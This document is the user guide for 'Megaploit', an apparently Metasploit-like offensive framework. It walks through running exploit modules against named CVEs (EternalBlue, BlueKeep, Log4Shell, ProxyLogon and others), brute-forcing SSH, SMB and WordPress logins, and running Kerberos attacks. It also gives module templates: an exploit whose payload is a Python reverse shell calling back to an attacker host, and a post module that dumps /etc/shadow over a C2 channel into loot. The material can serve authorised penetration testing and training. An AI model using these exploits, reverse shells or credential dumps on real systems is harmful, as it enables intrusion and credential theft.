# Megaploit Module System

How to use exploit and scanner modules, and how to write your own.

---

## Overview

The module system works like Metasploit. Every module has:
- A **name** (path like `exploits/linux/http/log4shell_cve2021_44228`)
- **Options** you set with `setopt`
- A **run** method that executes the module
- An optional **check** method that tests without exploiting

---

## Using Modules

### Step 1 — Find a module

```
megaploit [0] » show modules                          # list everything
megaploit [0] » show modules exploit                  # filter by type
megaploit [0] » show modules linux                    # filter by platform
megaploit [0] » show modules smb                      # filter by keyword
megaploit [0] » show modules log4                     # partial name match
```

### Step 2 — Select it

```
megaploit [0] » use exploits/linux/http/log4shell_cve2021_44228
```

The prompt changes to show the active module.

### Step 3 — Set options

```
megaploit [0] » options                        # see what's needed
megaploit [0] » setopt RHOSTS 10.0.0.50
megaploit [0] » setopt RPORT 8080
megaploit [0] » setopt LHOST 192.168.1.10
```

### Step 4 — Check (optional but recommended)

```
megaploit [0] » check
[+] 10.0.0.50:8080 — JNDI injection point confirmed (HTTP 200)
```

The check method tests if the target is vulnerable without sending any payload.

### Step 5 — Run

```
megaploit [0] » run
[+] Payload sent to 1/1 host(s)
[+] CONFIRMED callback from: 10.0.0.50
```

### Step 6 — Interact with the session

```
megaploit [1] » use 1
megaploit (10.0.0.50) > whoami
```

### Deselect the module

```
megaploit [0] » back
```

---

## All Exploit Modules

### Windows — SMB

#### `exploits/windows/smb/ms17_010_eternalblue` — EternalBlue

```
megaploit [0] » use exploits/windows/smb/ms17_010_eternalblue
megaploit [0] » setopt RHOSTS 10.0.0.5
megaploit [0] » setopt LHOST 192.168.1.10
megaploit [0] » check
megaploit [0] » run
```

CVE-2017-0144. Exploits the SMBv1 buffer overflow in Windows 7, Server 2008, and older.
Requires the target to have SMBv1 enabled and not patched with MS17-010.

#### `exploits/windows/smb/printnightmare_cve2021_1675`

```
megaploit [0] » use exploits/windows/smb/printnightmare_cve2021_1675
megaploit [0] » setopt RHOSTS 10.0.0.5
megaploit [0] » setopt LHOST 192.168.1.10
megaploit [0] » run
```

CVE-2021-1675. Windows Print Spooler remote code execution.

#### `exploits/windows/smb/smb_login_bruteforce`

```
megaploit [0] » use exploits/windows/smb/smb_login_bruteforce
megaploit [0] » setopt RHOSTS 10.0.0.0/24
megaploit [0] » setopt USERNAME admin
megaploit [0] » setopt PASSWORDS /wordlists/rockyou.txt
megaploit [0] » run
```

---

### Windows — RDP

#### `exploits/windows/rdp/bluekeep_cve2019_0708`

```
megaploit [0] » use exploits/windows/rdp/bluekeep_cve2019_0708
megaploit [0] » setopt RHOSTS 10.0.0.5
megaploit [0] » setopt LHOST 192.168.1.10
megaploit [0] » check
megaploit [0] » run
```

CVE-2019-0708. Pre-auth RCE in Windows Remote Desktop Services (Windows 7, Server 2008).

---

### Windows — HTTP

#### `exploits/windows/http/exchange_proxylogon_cve2021_26855`

```
megaploit [0] » use exploits/windows/http/exchange_proxylogon_cve2021_26855
megaploit [0] » setopt RHOSTS 10.0.0.10
megaploit [0] » setopt LHOST 192.168.1.10
megaploit [0] » run
```

CVE-2021-26855. Pre-auth SSRF in Microsoft Exchange Server.

#### `exploits/windows/http/iis_webdav_cve2017_7269`

```
megaploit [0] » use exploits/windows/http/iis_webdav_cve2017_7269
megaploit [0] » setopt RHOSTS 10.0.0.10
megaploit [0] » setopt RPORT 80
megaploit [0] » setopt LHOST 192.168.1.10
megaploit [0] » run
```

CVE-2017-7269. Buffer overflow in IIS 6.0 WebDAV.

---

### Windows — FTP

#### `exploits/windows/ftp/anon_ftp_deploy`

```
megaploit [0] » use exploits/windows/ftp/anon_ftp_deploy
megaploit [0] » setopt RHOSTS 10.0.0.20
megaploit [0] » setopt LHOST 192.168.1.10
megaploit [0] » run
```

Deploys the agent to a target that allows anonymous FTP writes.

---

### Linux — SSH

#### `exploits/linux/ssh/ssh_login_bruteforce`

```
megaploit [0] » use exploits/linux/ssh/ssh_login_bruteforce
megaploit [0] » setopt RHOSTS 10.0.0.0/24
megaploit [0] » setopt USERNAME root
megaploit [0] » setopt PASSWORDS /wordlists/common_passwords.txt
megaploit [0] » setopt THREADS 20
megaploit [0] » run
```

Brute-forces SSH login credentials. Requires `paramiko`: `pip install paramiko`

---

### Linux — HTTP

#### `exploits/linux/http/log4shell_cve2021_44228`

```
megaploit [0] » use exploits/linux/http/log4shell_cve2021_44228
megaploit [0] » setopt RHOSTS 10.0.0.50
megaploit [0] » setopt RPORT 8080
megaploit [0] » setopt LHOST 192.168.1.10
megaploit [0] » check
megaploit [0] » run
```

CVE-2021-44228. Log4Shell — JNDI injection in Apache Log4j2. Works on any platform
running a vulnerable Java application (Spring Boot, Elasticsearch, VMware, etc.).

#### `exploits/linux/http/heartbleed_cve2014_0160`

```
megaploit [0] » use exploits/linux/http/heartbleed_cve2014_0160
megaploit [0] » setopt RHOSTS 10.0.0.50
megaploit [0] » setopt RPORT 443
megaploit [0] » check
megaploit [0] » run
```

CVE-2014-0160. OpenSSL Heartbleed — leaks up to 64 KB of server memory per request.

#### `exploits/linux/http/apache_struts_cve2017_5638`

```
megaploit [0] » use exploits/linux/http/apache_struts_cve2017_5638
megaploit [0] » setopt RHOSTS 10.0.0.50
megaploit [0] » setopt RPORT 8080
megaploit [0] » setopt LHOST 192.168.1.10
megaploit [0] » run
```

CVE-2017-5638. Apache Struts 2 Content-Type OGNL injection (used in Equifax breach).

---

### Linux — Redis

#### `exploits/linux/redis/redis_unauth_rce`

```
megaploit [0] » use exploits/linux/redis/redis_unauth_rce
megaploit [0] » setopt RHOSTS 10.0.0.50
megaploit [0] » setopt LHOST 192.168.1.10
megaploit [0] » run
```

CNVD-2015-07557. Unauthenticated Redis → write SSH authorized_keys or cron job.

---

### Linux — Misc

#### `exploits/linux/misc/sudo_baron_samedit_cve2021_3156`

```
megaploit [0] » use exploits/linux/misc/sudo_baron_samedit_cve2021_3156
megaploit [0] » setopt RHOSTS 10.0.0.50
megaploit [0] » setopt LHOST 192.168.1.10
megaploit [0] » run
```

CVE-2021-3156. Heap overflow in sudo — allows unprivileged users to get root.

---

### Multi-Platform — HTTP

#### `exploits/multi/http/shellshock`

```
megaploit [0] » use exploits/multi/http/shellshock
megaploit [0] » setopt RHOSTS 10.0.0.50
megaploit [0] » setopt RPORT 80
megaploit [0] » setopt TARGETURI /cgi-bin/status
megaploit [0] » setopt LHOST 192.168.1.10
megaploit [0] » run
```

CVE-2014-6271. Bash environment variable injection via CGI scripts.

#### `exploits/multi/http/spring4shell_cve2022_22965`

```
megaploit [0] » use exploits/multi/http/spring4shell_cve2022_22965
megaploit [0] » setopt RHOSTS 10.0.0.50
megaploit [0] » setopt RPORT 8080
megaploit [0] » setopt LHOST 192.168.1.10
megaploit [0] » run
```

CVE-2022-22965. Spring Framework RCE via data binding on JDK 9+.

#### `exploits/multi/http/wordpress_xmlrpc_bruteforce`

```
megaploit [0] » use exploits/multi/http/wordpress_xmlrpc_bruteforce
megaploit [0] » setopt RHOSTS 10.0.0.50
megaploit [0] » setopt USERNAME admin
megaploit [0] » setopt PASSWORDS /wordlists/rockyou.txt
megaploit [0] » run
```

Brute-forces WordPress via `xmlrpc.php` — allows 50+ passwords per request.

#### `exploits/multi/http/sql_injection_login_bypass`

```
megaploit [0] » use exploits/multi/http/sql_injection_login_bypass
megaploit [0] » setopt RHOSTS 10.0.0.50
megaploit [0] » setopt TARGETURI /login
megaploit [0] » run
```

Tests common SQL injection payloads in login forms (`' OR '1'='1`, `admin'--`, etc.).

#### `exploits/multi/http/citrix_cve2019_19781`

```
megaploit [0] » use exploits/multi/http/citrix_cve2019_19781
megaploit [0] » setopt RHOSTS 10.0.0.50
megaploit [0] » setopt LHOST 192.168.1.10
megaploit [0] » check
megaploit [0] » run
```

CVE-2019-19781. Path traversal + RCE in Citrix ADC/Gateway.

---

### Multi-Platform — FTP

#### `exploits/multi/ftp/ftp_vsftpd_backdoor_cve2011_2523`

```
megaploit [0] » use exploits/multi/ftp/ftp_vsftpd_backdoor_cve2011_2523
megaploit [0] » setopt RHOSTS 10.0.0.50
megaploit [0] » setopt LHOST 192.168.1.10
megaploit [0] » run
```

CVE-2011-2523. Backdoor in vsFTPd 2.3.4 (triggered by `:)` in username).

---

### Multi-Platform — Handler

#### `exploits/multi/handler/reverse_shell_handler`

Generic handler for any reverse shell callback:

```
megaploit [0] » use exploits/multi/handler/reverse_shell_handler
megaploit [0] » setopt LHOST 192.168.1.10
megaploit [0] » setopt LPORT 4444
megaploit [0] » run
# Waits for any incoming connection
```

---

## Scanner Modules

Scanners are safe — they don't exploit anything.

### `auxiliary/scanner/tcp_port` — TCP Port Scanner

```
megaploit [0] » use auxiliary/scanner/tcp_port
megaploit [0] » setopt RHOSTS 10.0.0.0/24
megaploit [0] » setopt PORTS 22,80,443,3306,3389,8080
megaploit [0] » setopt THREADS 100
megaploit [0] » setopt TIMEOUT 2
megaploit [0] » run
```

### `auxiliary/scanner/smb_share_enum` — SMB Shares

```
megaploit [0] » use auxiliary/scanner/smb_share_enum
megaploit [0] » setopt RHOSTS 10.0.0.0/24
megaploit [0] » run
```

### `auxiliary/scanner/ssh_banner_grab`

```
megaploit [0] » use auxiliary/scanner/ssh_banner_grab
megaploit [0] » setopt RHOSTS 10.0.0.0/24
megaploit [0] » run
```

### `auxiliary/scanner/http_header_probe`

```
megaploit [0] » use auxiliary/scanner/http_header_probe
megaploit [0] » setopt RHOSTS 10.0.0.0/24
megaploit [0] » setopt RPORT 80
megaploit [0] » run
```

### `auxiliary/scanner/dns_resolver`

```
megaploit [0] » use auxiliary/scanner/dns_resolver
megaploit [0] » setopt RHOSTS internal-dc.corp
megaploit [0] » run
```

### `auxiliary/scanner/icmp_ping_sweep`

```
megaploit [0] » use auxiliary/scanner/icmp_ping_sweep
megaploit [0] » setopt RHOSTS 10.0.0.0/24
megaploit [0] » run
```

### `auxiliary/scanner/banner_grabber`

```
megaploit [0] » use auxiliary/scanner/banner_grabber
megaploit [0] » setopt RHOSTS 10.0.0.0/24
megaploit [0] » setopt PORTS 21,22,25,80,110,143,443
megaploit [0] » run
```

### `auxiliary/scanner/ldap_enum`

```
megaploit [0] » use auxiliary/scanner/ldap_enum
megaploit [0] » setopt RHOSTS 10.0.0.5
megaploit [0] » setopt DOMAIN CORPORATE.LOCAL
megaploit [0] » run
```

### Kerberos Modules

```
megaploit [0] » use auxiliary/scanner/kerberos_asrep_roast
megaploit [0] » use auxiliary/scanner/kerberos_kerberoast
megaploit [0] » use auxiliary/scanner/kerberos_dcsync
megaploit [0] » use auxiliary/scanner/kerberos_pass_the_hash
```

---

## Writing Your Own Module

Modules are Python files in `megaploit/modules/`. The file is auto-discovered.

### Minimal Scanner Module

```python
# File: megaploit/modules/auxiliary/my_scanner.py

from megaploit.modules.base import Module, ModuleType, OptionType


class MyScanner(Module):
    name        = "auxiliary/scanner/my_scanner"
    description = "My custom scanner module"
    module_type = ModuleType.AUXILIARY
    author      = "your-name"

    def _define_options(self) -> None:
        self._opt("RHOSTS",  OptionType.STRING,  required=True,  help="Target IP or CIDR")
        self._opt("RPORT",   OptionType.INTEGER, required=False, default=80, help="Port")
        self._opt("THREADS", OptionType.INTEGER, required=False, default=10, help="Threads")

    def run(self, session=None) -> list:
        self.validate()
        rhosts  = self.get("RHOSTS")
        rport   = self.get("RPORT")
        threads = self.get("THREADS")

        self._emit(f"[*] Scanning {rhosts}:{rport} with {threads} threads")

        # Your scan logic here:
        result = self._do_scan(rhosts, rport)
        if result:
            self._ok(f"Found service on {rhosts}:{rport}", host=rhosts, port=rport, banner=result)
        else:
            self._emit(f"[-] No service on {rhosts}:{rport}")

        return self.results

    def _do_scan(self, host, port):
        import socket
        try:
            s = socket.create_connection((host, port), timeout=2)
            banner = s.recv(1024).decode(errors='ignore')
            s.close()
            return banner
        except Exception:
            return None


MODULE = MyScanner    # ← required
```

### Exploit Module with check()

```python
# File: megaploit/modules/exploits/multi/http/my_exploit.py

from megaploit.modules.base import Module, ModuleType, OptionType
import requests


class MyExploit(Module):
    name        = "exploits/multi/http/my_exploit"
    description = "Example exploit module"
    module_type = ModuleType.EXPLOIT
    author      = "your-name"
    rank        = 500   # 0-999: how reliable is this exploit
    cve         = "CVE-2024-XXXXX"
    platform    = "linux"

    def _define_options(self) -> None:
        self._opt("RHOSTS",  OptionType.ADDRESS, required=True,  help="Target host")
        self._opt("RPORT",   OptionType.INTEGER, required=False, default=80, help="Port")
        self._opt("LHOST",   OptionType.ADDRESS, required=True,  help="Callback IP")
        self._opt("LPORT",   OptionType.INTEGER, required=False, default=4444, help="Callback port")
        self._opt("TARGETURI", OptionType.STRING, required=False, default="/", help="URI path")

    def check(self) -> bool:
        """Return True if the target looks vulnerable."""
        host = self.get("RHOSTS")
        port = self.get("RPORT")
        uri  = self.get("TARGETURI")
        try:
            r = requests.get(f"http://{host}:{port}{uri}", timeout=5)
            # Check for version string or other indicator
            if "X-Vulnerable-Header" in r.headers:
                self._emit(f"[+] {host}:{port} — target appears vulnerable")
                return True
            return False
        except Exception:
            return False

    def run(self, session=None) -> list:
        self.validate()
        host  = self.get("RHOSTS")
        port  = self.get("RPORT")
        lhost = self.get("LHOST")
        lport = self.get("LPORT")
        uri   = self.get("TARGETURI")

        self._emit(f"[*] Exploiting {host}:{port}")

        # Build and send payload
        payload = self._build_payload(lhost, lport)
        try:
            r = requests.post(
                f"http://{host}:{port}{uri}",
                data={"cmd": payload},
                timeout=10
            )
            if r.status_code == 200:
                self._ok(f"Payload sent to {host}", host=host)
            else:
                self._emit(f"[-] Unexpected response: {r.status_code}")
        except Exception as e:
            self._emit(f"[-] Failed: {e}")

        return self.results

    def _build_payload(self, lhost, lport):
        # Build your exploit payload here
        return f"python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('{lhost}',{lport}));...\""


MODULE = MyExploit
```

### Session-Bound Post Module (AgentModule)

Post modules run inside an active session:

```python
# File: megaploit/modules/post/linux/gather/dump_shadow.py

from megaploit.modules.base import AgentModule, ModuleType


class DumpShadow(AgentModule):
    name        = "post/linux/gather/dump_shadow"
    description = "Read /etc/shadow file from compromised Linux host"
    module_type = ModuleType.POST
    author      = "your-name"

    def run(self, session=None):
        """Run inside a live session. self.session is set if not passed."""
        sess = session or self.session
        if not sess:
            raise RuntimeError("No active session")

        # _send() forwards a shell command via the C2 channel
        output = self._send("shell cat /etc/shadow", sess)

        if output and output.strip():
            self._ok("Shadow file retrieved", content=output)
            # Save to loot automatically:
            self._save_loot("shadow", output.encode())
        else:
            self._emit("[-] Could not read /etc/shadow — need root?")

        return self.results


MODULE = DumpShadow
```

**Run it inside a session:**

```
megaploit session(1) » run post/linux/gather/dump_shadow
```

---

## Module API Reference

### `Module` base class

| Method | Description |
|---|---|
| `_opt(name, type, required, default, help)` | Define an option in `_define_options()` |
| `self.get(name)` | Get option value (type-cast automatically) |
| `self.validate()` | Raise `ModuleError` if any required option is missing |
| `self._emit(msg)` | Print a message to the console |
| `self._ok(msg, **data)` | Record a success result with optional data dict |
| `self.results` | List of result dicts (returned by `run()`) |

### `AgentModule` base class (extends `Module`)

Additional methods for session-bound post modules:

| Method | Description |
|---|---|
| `self._send(cmd, session)` | Send a command through the C2 channel, return response |
| `self._upload(local, remote, session)` | Upload a file to the target |
| `self._download(remote, local, session)` | Download a file from the target |
| `self._save_loot(name, data)` | Save bytes to the loot directory |

### Option Types

| Type | Accepted values |
|---|---|
| `OptionType.STRING` | Any text |
| `OptionType.INTEGER` | Whole number |
| `OptionType.BOOLEAN` | `true`/`false`/`1`/`0` |
| `OptionType.ADDRESS` | IPv4 address or hostname |
| `OptionType.CIDR` | CIDR notation like `10.0.0.0/24` |
| `OptionType.PORT` | Integer 1–65535 |
| `OptionType.ENUM` | One of a defined list |

---

## Module File Location

Place your module file anywhere under the relevant directory. The registry auto-discovers it:

```
megaploit/modules/
  auxiliary/      ← scanners, brute-force tools, passive recon
  exploits/
    linux/
      http/       ← your exploit file here
      ssh/
      misc/
    windows/
      smb/
      http/
    multi/
      http/
  post/
    linux/
      gather/     ← your post module here
    windows/
      gather/
```

After adding a file:

```
megaploit [0] » show modules
# Your new module appears automatically
```

If the module doesn't appear, it may have a syntax error. Check:

```bash
python3 -c "import megaploit.modules.exploits.multi.http.my_exploit"
```
